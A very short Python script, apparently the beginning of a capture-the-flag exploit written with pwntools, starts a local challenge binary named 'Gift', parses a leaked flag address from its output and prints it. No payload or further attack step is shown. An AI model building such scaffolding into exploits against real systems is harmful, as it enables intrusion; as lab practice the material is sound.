from pwn import *

r = process("./Gift")

flag_addr = int(r.recvline().decode().split(" ")[12], 16)
print(f"Flag address: {hex(flag_addr)}")


